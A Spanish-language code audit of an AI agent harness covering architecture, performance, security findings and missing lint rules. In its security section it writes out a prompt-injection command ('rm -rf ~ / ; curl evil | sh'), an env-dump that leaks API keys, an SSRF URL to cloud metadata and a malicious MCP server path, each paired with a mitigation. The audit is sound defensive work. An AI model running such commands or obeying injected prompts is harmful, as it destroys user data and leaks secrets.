# Auditoría integral — SOLID, rendimiento, seguridad y brechas del gate (2026-09-13)

- **Fecha:** 13-09-2026 · **Alcance:** workspace completo (`core` + `cli` + `desktop/src-tauri` + `desktop/ui/src`).
- **Volumen medido:** 131 `.rs` (1,72 MB) + 108 `.ts` (0,61 MB).
- **Método:** 4 pasadas paralelas en solo lectura (SOLID/arquitectura · rendimiento ·
  seguridad · gate) + verificación directa de las evidencias críticas
  (`cli/src/infra/ejecutor.rs:69-78`, `cli/src/comandos/daemon.rs:285`, tamaños por KB).
- **Estado de verificación:** cada hallazgo lleva marca `[V]` (verificado directo el
  13-09) o `[S]` (reportado por pasada, línea orientativa — el árbol evoluciona con
  139A-1…139A-7 y las líneas pueden haber driftado ±20). Ver §6 y la revisión al pie.
- **Precedentes:** `auditoria-solid-2026-09-05.md`, `auditoria-solid-2026-09-07.md`,
  `auditoria-rendimiento-2026-09-05.md`, `auditoria-rendimiento-2026-09-07.md`,
  `brechas-gate-2026-09-05.md`. Esta auditoría las consolida y añade seguridad +
  brechas del gate; no re-abre lo ya cerrado en 089A-16/109A-10/119A-1 salvo regresión.
- **Veredicto global:** el gate en verde (`0/0/1`) es real **en lo que mira**, pero hay
  **puntos ciegos estructurales** (async/SQLite, shell tipado, secretos en logs,
  rate-limit, duplicación cross-crate, god-objects Rust). Un hallazgo es
  **crítico** (K1, shell con input del modelo) y tres altos tocan dinero/secretos
  (K2, K3) o RCE diferido (K4). Nada de esto lo ve Sentinel hoy (§4).

---

## 1. SOLID y arquitectura

Dirección DIP global **correcta** [V]: `core` no referencia `cli`/`desktop`/`tauri`
(grep `use cli|use desktop|tauri::` en `core/src` → 0), `rusqlite` confinado a
`cli/src/persistencia_sqlite*` [S], y el god `main.ts` de 1182 líneas **ya está
resuelto** (máx. TS actual 373) [S]. El riesgo está en Rust.

God-objects medidos el 13-09 [V] (KB por `Measure-Object`):

| Fichero | Tamaño |
|---|---|
| `core/src/herramientas/tool.rs` | 53,3 KB |
| `core/src/nucleo/runtime/mod.rs` | 53,0 KB |
| `cli/src/servicio/sesion.rs` | 44,1 KB |
| `core/src/nucleo/context.rs` | 41,9 KB |
| `cli/src/comandos/web/mod.rs` | 41,8 KB |
| `core/src/herramientas/archivo/tools_archivo.rs` | 36,0 KB |
| `cli/src/persistencia_sqlite/conversaciones/mod.rs` | 35,2 KB |
| `core/src/nucleo/hooks.rs` | 34,4 KB |
| `cli/src/comandos/web/turnos.rs` | 32,7 KB |
| `cli/src/comandos/memoria.rs` | 30,0 KB |
| `core/src/herramientas/archivo/content_search.rs` | 29,6 KB |
| `core/src/herramientas/tareas.rs` | 29,1 KB |

### S1 — ALTA [S] — SRP: `tool.rs` god (contexto + resultado + trait + registry + permisos)

**Evidencia:** `core/src/herramientas/tool.rs:33-69` (`AgentToolContext`, 9 campos),
`:71-141` (`AgentToolResult` + 4 constructores), `:147+` (trait `AgentTool`),
`:169-322` (`AgentToolRegistry` + `registrar_mcp/registrar_sandbox/registrar_todo`),
tests desde `:833`. **Fix:** partir en `herramientas/contexto.rs`,
`herramientas/resultado.rs`, `herramientas/registro.rs`; `tool.rs` solo el trait (~120 lín.).

### S2 — ALTA [S] — SRP+OCP: `runtime/mod.rs` god (construcción + ciclo + telemetría + modos)

**Evidencia:** `core/src/nucleo/runtime/mod.rs:194` (struct con
registry+contexto+puertos+telemetría+reglas+planes+guardas+hooks), `:261-304`
(`::nuevo` hardcodea 8 `registrar_*`). Nueva tool core = editar la fábrica central.
**Fix:** `runtime/construccion.rs` con builder + lista declarativa o auto-registro
(`inventory`/`linkme`); telemetría a `runtime/telemetria.rs`, modos a `runtime/modos.rs`.

### S3 — ALTA [V] — ISP: `AgentPersistence` gorda (~20 métodos)

**Evidencia:** `core/src/contrato/ports.rs:281-368` (turnos+mensajes `:283-295`,
auditoría `:298`, memoria `:302-318`, skills `:321`, scheduler `:325-339` + 2 defaults
con cuerpo `:349-354,365-368`). Quien solo necesita turnos conoce memoria/skills/scheduler.
**Fix:** segregar `PersistenciaTurnos` / `PersistenciaMemoria` / `PersistenciaSkills` /
`ColaTareas`; `AgentPersistence` = trait compuesto, no monolito.

### S4 — ALTA [V] — ISP+LSP: defaults tramposos en el puerto

**Evidencia:** `ports.rs:349-354` (`skills_registrar` default → `Err("no implementado")`),
`:365-368` (`memoria_ambitos` default → `Ok(vec![Global])`, "solo global… no cura por
proyecto"). Peor que `todo!`: fallo en runtime en vez de en compilación.
**Fix:** subtraits `SoportaSkills` / `SoportaAmbitos` + detección de capacidad explícita.

### S5 — ALTA [V] — ISP: `NavegadorPort` 9 métodos, CLI/web con `None`

**Evidencia:** `ports.rs:581-600` — 9 métodos verificados
(`abrir/navegar/capturar/js/cdp/click/rellenar/snapshot/cerrar`; corrección v2: v1 decía 10).
**Fix:** `NavegadorBase` + `Capturable` + `Scriptable` + `Automatizable`.

### S6 — ALTA [S] — DIP: `core` depende de `reqwest` concreto (no testeable sin red)

**Evidencia:** `core/src/nucleo/llm/mod.rs:55` (`client: reqwest::Client`),
`red.rs:63,76,81,120`, `stream.rs:23`, `hooks.rs:389,410`. En `cli` el uso sí es
correcto (`infra/fetch.rs:22` tras puerto `WebFetchProvider`, `ports.rs:439-442`).
**Fix:** `HttpPort` (`get`/`post_stream`) en `contrato/`, implementado en `cli`/`desktop`.

### S7 — ALTA [S] — DRY ×3: filesystem triplicado (3 límites, 2 validaciones)

**Evidencia:** `desktop/src-tauri/src/archivos/filesystem.rs` (`MAX_FILE_BYTES` 256 KB
`:20`, excluidos `:25`, validación manual `Component:12`) vs
`cli/src/comandos/web_datos/files.rs` vs `core/.../tools_archivo.rs:18-24`
(`MAX_LECTURA` 1 MB) sobre `SandboxArchivos::resolver/leer` (`sandbox.rs:96-132,198-210`).
Un bug de traversal se arregla en un sitio y queda en dos.
**Fix:** única `FileSystemPolicy` + `SandboxArchivos` como única validación; Tauri y
web_datos = adaptadores finos.

### S8 — MEDIA-ALTA [S] — DRY ×2: git duplicado (dos contratos para el front)

**Evidencia:** `desktop/src-tauri/src/proyecto/git.rs` (503 lín.) vs
`cli/src/comandos/web_datos/git.rs`. **Fix:** `core::git::ServicioGit` + pasarelas.
Nota 13-09: 139A-2 añadió `arbol_repos`/barrido multi-repo en `git.rs` — la
duplicación sigue viva, ahora con más superficie.

### S9 — MEDIA-ALTA [S] — Triple sesión (ciclo de vida + transporte mezclados ×3)

**Evidencia:** `cli/src/servicio/sesion.rs:87-107` + `cli/src/comandos/web/mod.rs:84-100`
(`SesionWeb`) + `Sesion` Tauri (`desktop/src-tauri/src/main.rs:85-107).
**Fix:** `SesionComun` solo núcleo; `SesionWeb`/`Sesion` = `comun + EstadoTransporte`.

### S10 — MEDIA [S] — `web/mod.rs` (1017) + `turnos.rs` (817): routing + auth + sesiones + SSE

**Evidencia:** `web/mod.rs:58-66` (token/cookie), `:79-100`, límites `:73-77`.
**Fix:** `web/auth.rs`, `web/sesiones.rs`, `web/sse.rs`; `mod.rs` solo ensambla `Router`.

### S11 — MEDIA [S] — OCP: `AgenteEvento` 20+ variantes con N consumidores switch

**Evidencia:** `core/src/contrato/evento.rs:52-248`; consumidores
`nucleo/cron.rs:151-156`, `tauri/aplicarEventos.ts` (329 lín.), `adaptadores/api.ts:19-29`.
**Fix:** visitor/render por familia + test de exhaustividad que obligue a registrar
renderer en vez de editar el switch.

### S12 — MEDIA [S] — OCP: añadir tool/proveedor = tocar N ficheros

**Evidencia:** `registrar_tool_*` por módulo (`pregunta.rs:97`, `repo_map.rs:502`,
`tareas.rs:466`, `comando.rs:191`, `tools_web.rs:124`, `memoria/tools.rs:183`,
`todo.rs:454`, `subagente.rs:298`, `tools_archivo.rs:463`) + alta central
(`runtime/mod.rs:266-304`) + cableado (`run.rs:357-380`) + 60 comandos Tauri
(`main.rs:489+`). **Fix:** macro `#[tool]` con auto-registro.

### S13 — MEDIA [S] — `context.rs` (992) + `hooks.rs` (921) mezclan responsabilidades

**Evidencia:** `context.rs` con 7 `match… _ =>` de cómputo (`:35,491,544,597,760,839,953`);
`hooks.rs` mezcla dispatcher + validación URL + cliente HTTP (`:389,410`).
**Fix:** `contexto/ventana|secciones|tokens.rs`; `hooks/dispatcher` vs `hooks/http`
(tras S6, con `HttpPort`).

### S14 — MEDIA [S] — DIP invertido en front: adaptador importa componentes

**Evidencia:** `desktop/ui/src/adaptadores/api.ts:19-21`
(`from '../tauri/real'`, `from '../componentes/panelGit'`); `orquestador/*` importa
componentes concretos (`barraLateral.ts:10`, `crearPanel.ts:15`, `arranque.ts:7`).
**Fix:** tipos solo en `dominio/tipos.ts`; la vista importa del dominio, nunca al revés.

### S15 — BAJA [S] — Barrel `export *` + fan-in de `main.ts`

**Evidencia:** `tauri/real.ts:6` (`export * from './realTipos'`); `main.ts:15-49`
(~20 imports, DI por cierres, comentarios TDZ `:64-69,105-106,119-120`).
**Fix (no urgente):** exports nombrados + `orquestador/composicion.ts`.

---

## 2. Rendimiento (por impacto medible)

### R1 — ALTA [V] — SQLite tras un único `Mutex<Connection>` usado desde código async

**Evidencia:** `cli/src/persistencia_sqlite.rs:8-10` ("una sola `Connection` tras
`Mutex`… no se usa `spawn_blocking`"), `:25` (`Arc<Mutex>`), consumidores
`conversaciones/mod.rs:80,121,174`. Turno largo bloquea listados y heartbeats.
**Fix:** pool (1 escritor + N lectores) o hilo de escritura con cola; lecturas pesadas
fuera del lock; si se mantiene rusqlite, aislar con `spawn_blocking`.

### R2 — ALTA [S] — I/O bloqueante dentro de futures (sin `spawn_blocking`)

**Evidencia:** `persistencia_sqlite.rs:8-10`, `servicio/sesion.rs:487-491,519-547`
(awaits que terminan en rusqlite bloqueante). Sube el p99 de SSE, Tauri y `preparar_turno`.
**Fix:** capa SQLite tras `spawn_blocking` o actor; el async solo orquesta.

### R3 — ALTA [V] — Cada turno recarga TODO el historial + listado completo para auto-nombrar

**Evidencia:** `sesion.rs:487-513` (`listar_mensajes` completo → filtro en memoria),
`:519-526` (`conversaciones_listar` completo para 1 título), `:534-547` (2 escrituras
secuenciales), `cli/src/ui/turno.rs:27-33`. O(n) filas + clones + tokens por turno.
**Fix:** `WHERE conversacion_id=? AND creado_en>=? ORDER BY…`, `SELECT … WHERE id=?`,
auto-nombre en el path de creación, paginar historial efectivo. Restricción [V]:
conservar la semántica `>=` por precisión de segundos (`sesion.rs:498-503`:
`SecondsFormat::Secs` — duplicar algo resumido es inofensivo, perder un turno no).

### R4 — MEDIA-ALTA [S] — `ORDER BY`/JOINs sin índice que los cubra

**Evidencia:** `conversaciones/mod.rs:84-85` (`WHERE user_id ORDER BY actualizada_en DESC`
con solo `idx_conversaciones_ws(user_id,workspace_id)` en `persistencia_sqlite.rs:225`),
`:124-130` (`LEFT JOIN workspaces…`), `:212,:219`, `tareas.rs:51,136`,
`tablas turnos/acciones` (`persistencia_sqlite.rs:74-98`) sin índice por
`conversacion_id`/`turno_id` (lecturas `:382,:421`).
**Fix:** 6 índices: `(user_id,actualizada_en DESC)`, `(conversacion_id,creado_en)`,
`(turno_id,id)`, `(user_id,creado_en)`, `(tarea_id,ejecutada_en DESC)`,
`(user_id,fijado DESC,creada_en DESC)`.

### R5 — MEDIA [V] — Un `emit` + `serde_json::to_value` por token del stream

**Evidencia:** `cli/src/comandos/web/turnos.rs:340-353`, canal 64 en `:369-384`
(`DifusionSse` canal 256 con `try_send`). **Fix:** coalescing ~50–100 ms o N tokens,
evitar `to_value` en path caliente, separar canal control/datos.

### R6 — MEDIA [S] — Cierre de turno con refetch completo en el frontend

**Evidencia:** `panelChatTurno.ts:151-162` (`resincronizarSidebar()` + `sesion.listar()` +
`find`), `apiCliente.ts:96-107` (`componerSesion` = 2 GET),
`orquestador/arranque.ts:169-181`. Nota 13-09: 139A-7 mitiga el caso Cambios
(single-flight + firmas); el refetch de sidebar/listar sigue.
**Fix:** `turn.finished` con título/uso incluido, actualización optimista, `listar`
incremental/paginado.

### R7 — MEDIA [S] — `pintarHistorial` reconstruye todo el DOM + `JSON.parse` 2× por acción

**Evidencia:** `panelChatHistorial.ts:39-48,69-76,79-93,87-90`. Jank en hilos largos.
**Fix:** append incremental, parse único, virtualización/paginación, delegación de eventos.

### R8 — MEDIA [V] — Clones evitables en el camino del mensaje

**Evidencia:** `sesion.rs:539,556-557` (`mensaje.clone()` ×2 + `format!("[META…]")`),
`turnos.rs:342-345` (`provider/modelo.clone()` por evento), `ui/turno.rs:76,85-89`,
`runtime/turno/mod.rs:54-63` (`Vec<String>` clonada del historial).
**Fix:** mover en vez de clonar, `Cow<str>`, buffers reutilizados, hash/ventana para el
detector de repetición.

### R9 — MEDIA-BAJA [S] — `eventos_turno.payload_json` sin paginación en lectura

**Evidencia:** `persistencia_sqlite.rs:147-154` (tabla + `idx_eventos_turno(turno_id,id)`),
`eventos_turno.rs:68`, visor `verLogTurno → mostrarLogTurno`. **Fix:** paginar/limitar,
truncar payloads verbose, excluir frames ya presentes en `mensajes`.

### R10 — MEDIA-BAJA [S] — `repo_map`/`content_search` en camino caliente

**Evidencia:** `repo_map.rs` (`PROFUNDIDAD=8`, `MAX_ARCHIVOS=2000`,
`MAX_BYTES_ARCHIVO=200_000`, salida 12 000 B), `content_search.rs` (índice en
`<temp>/glory-harness/tgrep-idx/<hash16>/` + manifiesto, `Mutex` por índice, fallback
50 resultados). **Fix:** caché por mtime/manifiesto compartida, cómputo async/debounced
fuera del turno, solo a demanda.

### R11 — BAJA [S] — Reloj 1 s + `ResizeObserver` con layout + SSE sin batch en UI

**Evidencia:** `arranque.ts:86-94` (`setInterval` 1 s), `panelChat.ts:112-116`
(`getBoundingClientRect` + CSS var), `apiCliente.ts:124-162` (parse + pintado por token).
**Fix:** pausar reloj sin turno, throttle/rAF, batch de tokens antes del DOM.

### R12 — BAJA [S] — Build: `lto="thin"` global + PRAGMAs conservadores

**Evidencia:** `Cargo.toml` (`[profile.release] lto="thin"`),
`persistencia_sqlite.rs:343` (WAL), `:346` (`synchronous=NORMAL`), `:348`
(`cache_size=-2000` ≈ 2 MB), `:350` (`busy_timeout=5 s` — enmascara R1).
**Fix:** perfilar antes de tocar LTO; subir caché (p. ej. `-16000`), política de
checkpoint WAL, bajar `busy_timeout` al eliminar el Mutex global.

---

## 3. Seguridad (por riesgo real)

### K1 — CRÍTICA [V] — Inyección de comandos vía shell en tool `comando`

**Evidencia:** `cli/src/infra/ejecutor.rs:69-78` — `Command::new("cmd").arg("/C")` /
`Command::new("sh").arg("-c")` donde `comando: &str` viene de la tool del modelo.
Prompt inyectado (`rm -rf ~ / ; curl evil | sh`) se ejecuta.
**Mitigación:** sin shell (`execvp` + `argv`), allowlist de binarios, riesgo alto con
aprobación explícita y denegado por defecto.

### K2 — ALTA [S] — Herencia de entorno con claves LLM a hijos

**Evidencia:** `ejecutor.rs:69` + `core/src/nucleo/llm/red.rs:83`. `env|printenv` del
modelo exfiltra `CEREBRAS_API_KEY/GROQ_API/DEEPSEEK_API/GLORY_API_KEY`.
**Mitigación:** `env_clear()` + allowlist mínima, nunca pasar `LlavesProveedor` a
`comando`/hooks, redactar claves en logs/resultados.

### K3 — ALTA [V] — Modo web tokenless en loopback sin auth maestra

**Evidencia:** `cli/src/comandos/web/mod.rs:570` (modo local sin token, solo loopback).
Cualquier proceso local o `fetch` a `127.0.0.1:8799` crea sesión con ejecución de agente.
**Mitigación:** exigir `GLORY_HARNESS_WEB_TOKEN` siempre, puerto efímero `:0` + token de
un solo uso, sin modo sin-token.

### K4 — ALTA [V] — Ejecución de hooks por configuración (`gancho_pre_compact`)

**Evidencia:** `core/src/nucleo/hooks.rs:47` + `cli/src/servicio/sesion_config.rs`;
ejecución en `hooks.rs:285` (`Command::new(comando)`). Si el modelo escribe la config,
el próximo `PreCompact` ejecuta su binario.
**Mitigación:** allowlist de binarios/rutas absolutas, config fuera del workspace
escribible, confirmación para registrar hooks.

### K5 — ALTA [S] — Jaula `cwd` evadible con `cd` en shell (límite admitido en código)

**Evidencia:** `ejecutor.rs:10-16` — el propio comentario admite que el shell hace
`cd ..` fuera del workspace. **Mitigación:** no usar shell, denegar `cd/pushd`,
re-validar `cwd` tras ejecución.

### K6 — ALTA [S] — SSRF en hooks `http`

**Evidencia:** `hooks.rs:408` (`POST` a URL de config; `timeout 10s` ya existe).
`url:http://169.254.169.254/` exfiltra metadatos cloud.
**Mitigación:** allowlist (`localhost` + dominios explícitos), bloquear link-local/privadas,
sin redirects.

### K7 — ALTA [S] — Servidores MCP stdio como ejecución arbitraria

**Evidencia:** `core/src/herramientas/mcp.rs` (`McpProveedorStdio`); una entrada MCP
apunta a `C:\evil\server.exe` y el harness lo spawnea. **Mitigación:** allowlist de
rutas + hash, confirmación al añadir servidores (`sanitizar_id` ya existe).

### K8 — MEDIA [S] — Path traversal TOCTOU / `canonicalize` solo si existe + 1 join sin validar

**Evidencia:** `core/src/contrato/sandbox.rs:96`; symlink entre `resolver()` y
`escribir/leer` redirige fuera; `cli/src/comandos/memoria.rs:417`
(`Path::new(&area.ruta).join(CARPETA_PROYECTO)` sin prefijo/`canonicalize`) vs
`web_datos/files.rs:247-275` y `filesystem.rs:254-275` que sí validan.
**Mitigación:** `O_NOFOLLOW` + `canonicalize` post-open + re-chequeo de prefijo, denegar
symlinks/junctions; corregir `memoria.rs:417`.

### K9 — MEDIA [V] — CSRF con cookie `gh_sesion` permisiva

**Evidencia:** `web/mod.rs:217` (`origen_valido` acepta `Origin/Referer` ausente,
`SameSite=Lax`). **Mitigación:** exigir `Origin==Host` en POST/PUT/DELETE con cookie,
rechazar sin `Origin/Referer` en mutaciones, `SameSite=Strict` + `__Host-`.

### K10 — MEDIA [S] — Superficie Tauri IPC + filesystem espejo

**Evidencia:** `archivos/filesystem.rs` + `capabilities/default.json`; un XSS invoca
lectura si solo valida el front. **Mitigación:** re-validar toda ruta en backend con
`SandboxArchivos::resolver`, capability mínima por comando, CSP estricta en webview.

### K11 — MEDIA [V] — Sink `innerHTML` residual en iconos reutilizables

**Evidencia:** `iconos.ts:120` (`iconoHtml()/spinnerHtml()` para `innerHTML`); si se
reutilizan con texto del modelo/diff aparece `<svg onload=…>`.
**Mitigación:** solo `icono()/ponerIcono()` con `createElement`/`DOMParser image/svg+xml`,
prohibir `innerHTML` con datos runtime, CSP `script-src 'none'`.

### K12 — MEDIA [V] — Sin rate-limit en web/daemon (límite de cuerpo SÍ existe)

**Evidencia:** `web/turnos.rs:27-28` ("F6 fijará rate limits; el tamaño se valida desde
F2") + `MAX_MENSAJE_CHARS=32000`; `daemon.rs:287`; 429 solo para tope de sesiones
(`mod.rs:1077`). **Corrección v2:** el límite de cuerpo SÍ existe
(`RequestBodyLimitLayer::new(BODY_MAX_BYTES)` en `web/mod.rs:542`, import `:45`) —
lo que falta es rate-limit por sesión/IP + tope de turnos concurrentes. Bucle local
`POST /turns` quema cuota LLM.
**Mitigación:** `tower_governor` por sesión/IP, tope de turnos concurrentes y coste.

### K13 — MEDIA [V] — Secreto en log tras `--mostrar-token`

**Evidencia:** `cli/src/comandos/daemon.rs:285`
(`eprintln!("[glory-harness] daemon token: {token}")`). **Mitigación:** no imprimir
secretos; token por archivo efímero o una sola vez con aviso.

### K14 — BAJA [V] — Panics con lock: verificado SIN defecto en `core` (era falso positivo)

**Evidencia (revisión v2):** los 74 `lock().expect("lock")/lock().unwrap()` de `core/src`
están TODOS bajo `#[cfg(test)]` (`cron.rs:329+`, dobles de `scheduler.rs:444,447-449`,
`hooks.rs:601+`, mocks de `tareas.rs`/`sandbox.rs`/`comando.rs`/`navegador/pruebas.rs`).
El código de producción ya usa la forma tolerante a envenenado
`lock().unwrap_or_else(|p| p.into_inner())` (`runtime/mod.rs` ×10: `:329,333,375,433,`
`457,482,488,507,515,522,579,613`; `memoria/soporte.rs:49,135,164`;
`content_search.rs:252,301`; `turno/mod.rs:284,579`). Las citas v1
(`scheduler.rs:444`, `hooks.rs:627`) eran dobles de test, no producción.
**Mitigación:** ninguna en `core`; mantener la regla `unwrap-produccion-rs` (verde) para
`cli`/`desktop` y no introducir `expect` fuera de tests.

### K15 — BAJA [S] — Supply chain sin auditoría fijada + debugging remoto documentado

**Evidencia:** `Cargo.toml`/`Cargo.lock` (`tgrep-core` por git tag v1.0.5),
`tauri.conf.json:8`, `--remote-debugging-port` en pasada Tauri 11-09.
**Mitigación:** `cargo audit`/`deny` + `pnpm audit` en gate, pins por hash,
`devUrl localhost:1420` solo dev, sin debugging en release.

---

## 4. Lo que Sentinel debería reportar y no reporta

Gate: Sentinel `0.7.8@1587c59` + VarSense `2.2.1`, etapas
`coverage→sccache→sentinel→rust` (`scripts/quality/stages.json`) [S].
**Sin etapa `varsense` en el gate canónico**: VarSense solo corre en consola del área;
el `0/0/0` es solo Sentinel+coverage+sccache+rust.

### 4.1 Calibración (reglas que hacen ruido o callan)

| Regla | Estado | Veredicto |
|---|---|---|
| `catch-vacio`, `hardcoded-secret`, `innerhtml-variable`, `unwrap-produccion-rs`, `panic-produccion-rs`, `git-add-all`, `unsafe-process-shell` (`error`) | Fijadas `sentinel.config.json:58-67` | Correcto; `innerhtml`+`catch` cazaron deuda real en 089A-13 |
| `barras-decorativas` (`warning`) | Fijada | **Mal calibrada → `hint`**: 62/116 warnings en 089A-13 enterraron los 14 errores reales |
| `console-production` (`warning`) | Default | **Debería ser `error`**: 8 casos eran fuga visible al usuario (109A-9) |
| `todo-pendiente` (`hint`) | Default | Bien en `hint`, **regex rota**: `defaultRules.ts:208` marca `/// todo el historial` (`context.rs:972`) — FP también en TASKS/RESTAURANTE/coolify |
| `large-interface-isp` (`info`) | Default | Bien en `info` (no debe bloquear; 5 infos en `129A-8`) |
| `limite-lineas` (+nivel-2/3) | Default | Correcto en TS (`main.ts:1182/300`); **en Rust no hay tope** → S1/S2/S13 pasan |
| `claseHuerfana` (VarSense) | Default | No resuelve plantilla (`` `git-diff-${tipo}` `` en `gitDiff.ts`) ni ternario (`'ic'+…`); barre 4516 archivos (incluye `data/referencias-cli/**`), cifra no comparable |
| `unwrap-produccion-rs` / `axum-ruta-sintaxis-rs` | 0.7.8@`1587c59` | Ruido ya corregido upstream (109A-10): 30× en módulos `#![cfg(test)]`, 19× que aconsejaban romper rutas axum 0.8 |
| Preflight disco (`sentinel-rust.mjs`, `GLORY_MIN_FREE_GB=8`, exit 2) | 119A-1 | A medias: `sentinel check` **no propaga** la env a la etapa `rust` (probado con 5 y 6) |

### 4.2 Deuda tapada por excepción (no corregida)

- `excludePatterns: **/data/referencias-cli/**` (`sentinel.config.json:42-49`): cuarentena
  legítima sin fecha de re-inclusión ni tarea de quema.
- `directoryExceptions: [componentes, orquestador]` (`:50-53`): tapa
  `directorio-abarrotado` (22 archivos en 089A-13); la reorg. nunca ocurrió.
- `portableBoundaries{dom,window}` (`:54-57`): correcto en diseño, pero sin regla de fan-in
  (cualquier `document.*` bajo `plataforma/` pasa).
- `excepciones-varsense.json`: 1× `todo-pendiente` (`context.rs:972`; v1 decía 971) como
  workaround de papel — hoy ya son 2 hints (`context.rs:972` [V],
  `permisos.rs:189-190` [V: la palabra "pendiente" en el doc-comentario de
  `pausa_por_aprobacion_en_turno`]).
- `hardcodedDetection.severity: warning` (`varsense.config.json:22-25`): literales fuera
  de `variables.css` solo avisan (p. ej. `#c42b1c` de 089A-3, excepción pedida).

### 4.3 Gaps: qué debería reportar y no reporta (con ejemplo real)

| # | Gap | Ejemplo | Por qué es ciego |
|---|---|---|---|
| G1 | N+1 / fan-out por conversación | `web_datos/conversaciones.rs:120-137` [V]: 3 awaits secuenciales (`sesion_y_comun` :120, `conv_propia` :124, `listar_mensajes` :125-129) + 2 llamadas sqlite bloqueantes (`acciones_por_conversacion` :130-133, `turno_ultimo_uso…` :134-137); 139A-7 confirma re-ejecución al cambiar de conversación | Sin regla de fan-out DB/HTTP ni batch |
| G2 | `rusqlite` bloqueante en `async` | `persistencia_sqlite/puerto.rs:26` (`async fn guardar_turno` → `bloquear().execute()`); 0 `spawn_blocking` en `web_datos/` | No mira `std::Mutex` dentro de `async fn`; `rust` stage solo clippy/tests |
| G3 | `.clone()` en hot path | `scheduler.rs:66` (`.clone()` en loop), `web_datos/mod.rs:98` (`.lock().await.clone()` por request) | Sin regla `clone-en-loop` / `clone-bajo-lock-async` |
| G4 | `path.join` sin `canonicalize` | `comandos/memoria.rs:417` (los 2 buenos sí se auditaron; el tercero pasa) | Cobertura por fichero, no por patrón |
| G5 | `shell -c` con input del modelo | `infra/ejecutor.rs:69-78` [V] | `unsafe-process-shell` no dispara sobre este wrapper tipado |
| G6 | XSS vía `html` del modelo | `mensajesUtil.ts:102-104` (`r.html → ponerHtmlSeguro`); allowlist `:65-99` bien, pero nadie audita al productor | `innerhtml-variable` ya no dispara (usan `textContent`) |
| G7 | POST sin rate-limit (body limit SÍ existe) | `web/mod.rs:457-499` sin `tower_governor`; `turnos.rs:27` lo admite; `RequestBodyLimitLayer` presente en `mod.rs:542` [V] | Sin regla `ruta-post-sin-rate-limit` |
| G8 | Secreto en log | `daemon.rs:285` [V] | `hardcoded-secret` busca literales, no `eprintln!(…token)` |
| G9 | Invariante 129A-3 sin cobertura | `permisos.rs:80-83,195-226` (oneshot por id); gate PASS 12-09 era sobre el diseño viejo | `rust` cuenta tests (459 ok) pero no exige el invariante pausa→aprobar→mismo-turno |
| G10 | Saturación `C:\tmp`/disco | `sentinel-rust.mjs:110-120` + env no propagada | Sin regla de writes sin cota |
| G11 | Duplicación filesystem ×3 | `filesystem.rs:108,347` + `files.rs:212,247,345` (`// port de …`) + `archivo.rs:25` | Sin detector de clones entre crates |
| G12 | God-objects Rust | 7 ficheros >32 KB (§1) | `limite-lineas` solo TS |
| G13 | Acoplamiento UI | `main.ts` 373 lín./17 KB, `aplicarEventos.ts` 13 KB, `barraLateral.ts` 15 KB | Sin métrica fan-in/fan-out; excepción muda |

### 4.4 Reglas nuevas propuestas (para el dueño: `glory-sentinel`)

**Sentinel (10):** `rusqlite-bloqueante-en-async` (error: `async fn` con
`Mutex<Connection>.lock()` sin `spawn_blocking`; ➕ `puerto.rs:26`) ·
`shell-modelo-sin-allowlist` (error: `Command::new("cmd"|"sh")` con arg que fluye de
parámetro `comando:&str`; ➕ `ejecutor.rs:69-78` [V]; ➖ `git.rs:385` argv fijo) ·
`secreto-en-log` (error: `(e)println!/tracing/log` × `token|secret|Bearer|api_key`;
➕ `daemon.rs:285` [V]) · `ruta-post-sin-rate-limit` (error: `post(_)` sin
`RateLimit|governor`; ➕ `web/mod.rs:457-499`) · `path-join-sin-canonicalize` (error:
`join` sin `canonicalize()+starts_with`; ➕ `memoria.rs:417`) ·
`html-modelo-sin-origen-auditado` (error: productor `html` fuera de los 3 auditados) ·
`sqlite-carga-N-consultas` (warning: ≥3 awaits secuenciales a persistencia sin
`join!`; ➕ `conversaciones.rs:125-137`) · `clone-bajo-lock-async` (warning;
distinguir `Arc::clone` barato) · `god-object-rs` (warning >500 lín., error >800;
excepción `mod.rs` re-export) · `port-filesystem-duplicado` (warning: similitud >0.8
en ≥2 crates; waiver `// diverge de X porque …`).

**VarSense (5):** `orphan-plantilla-resuelta` (resolver `` `pref-${var}` `` + ternarios
antes de marcar) · `css-var-sin-token` (subir `hardcodedDetection` a error en UI) ·
`todo-prosa-vs-marcador` (exigir `TODO:|TODO(|FIXME|XXX`; no marcar `todo el…`) ·
`ui-fanout-directorio` (excepción con tarea+fecha en roadmap, no muda) ·
`duplicado-cross-crate` (info→warning con rutas y similitud).

Prioridad al dueño: seguridad/red (S4+S2+S3+S5 de §4.4) → async/SQLite (S1+S7) →
calibración de ruido (`todo`, `claseHuerfana`, `barras`) → estructural (S9+S10+V5).

---

## 5. Priorización de remediación (propuesta; el plan la convierte en fases)

1. **Seguridad K1–K7 + K13** (crítico/alto; K1 es lo único crítico).
2. **Contención SQLite R1–R4** (causa de latencias; 139A-7 ya mitiga el síntoma Cambios).
3. **Unificar filesystem/git/path S7+S8+K8** (elimina una clase entera de bugs).
4. **Segregar puertos S3–S5 + partir S1+S2** (desbloquea el resto).
5. **Streaming/DOM R5–R8** (coalescing, `turn.finished` completo, historial incremental).
6. **Gate:** 10+5 reglas (§4.4) — compete a `glory-sentinel`, este repo solo sube el pin.

---

## 6. Estado de verificación y revisión (13-09)

- Verificado directo [V] (v1): `ejecutor.rs:69-78` (shell con string del modelo,
  comentario `cd` en `:10-16`), `daemon.rs:285` (token en log), tamaños KB de los 12
  ficheros (§1), `139A-1…139A-7` existentes (siguiente ID libre: **139A-8**).
- Verificado directo [V] (revisión v2): `persistencia_sqlite.rs:1-30` (Mutex único +
  "no se usa `spawn_blocking`" deliberado) → R1/R2 en pie; `ports.rs:281-368` (S3/S4
  verbatim, incluido el comentario `funcion-larga-rs`) y `:581-600` (S5 = 9 métodos);
  `sesion.rs:487-557` (R3/R8 verbatim + restricción `>=`/segundos);
  `hooks.rs:285` (`Command::new(comando)` directo, no shell — K4 matizado),
  `:389-412` (reqwest + timeout), `:615-644` (doble de test — K14 cae);
  `web/mod.rs:45,62-68,112,164,215-217,269,351,373,542,568-579` (K3/K9 en pie,
  body-limit presente — K12 corregido); `turnos.rs:27-28,49,335-358` (R5/G3 verbatim,
  `unwrap_or` sin panic); `scheduler.rs:55-84` (clone acotado a 5 tareas) y `:440-472`
  (doble de test); `memoria.rs:405-423` (G4/K8 verbatim; fuente = fila de BD, no input
  directo); `conversaciones.rs:118-142` (G1 verbatim);
  `mensajesUtil.ts:57-105` (sanitizador real span/br+class — G6 matizado);
  `iconos.ts:94-119` (K11 verbatim); `context.rs:972` + `permisos.rs:189-190`
  (FP `todo-pendiente` verbatim); `stages.json` (4 etapas, sin varsense);
